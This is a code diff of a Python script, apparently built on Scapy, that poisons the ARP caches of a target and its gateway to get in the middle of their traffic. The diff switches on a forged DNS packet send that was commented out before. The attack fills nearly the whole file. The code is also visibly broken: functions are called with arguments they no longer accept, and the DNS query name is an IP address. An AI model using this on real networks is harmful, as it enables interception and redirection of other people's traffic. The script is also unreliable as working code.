@@ -11,16 +11,12 @@ def spoofarpcache(targetip, targetmac, sourceip):
     send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
     print("yo")
 
-def sendFakeDNS(pkt):
+def sendFakeDNS():
     dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="61.13.148.37"))
-    print("Une requete")
-    #•send(dnsResPacket)
+    send(dnsResPacket)
 
-def DNSSpoofing(iptarget):
-    try :
-        sniff(filter="udp and port 53", prn=sendFakeDNS, count=1)
-    except time.sleep(0.5):
-        print("rien")
+def DNSSpoofing():
+    sniff(filter="udp and port 53", prn=sendFakeDNS, count=1)
 
 def restorearp(targetip, targetmac, sourceip, sourcemac):
     packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
@@ -50,9 +46,7 @@ def SingleSniffing(targetip, passerelleip):
                 spoofarpcache(targetip, targetmac, gatewayip)
                 spoofarpcache(gatewayip, gatewaymac, targetip)
                 DNSSpoofing(targetip)
-                print("Hey")
                 time.sleep(0.5)
-
         except KeyboardInterrupt:
             print("ARP spoofing stopped")
 
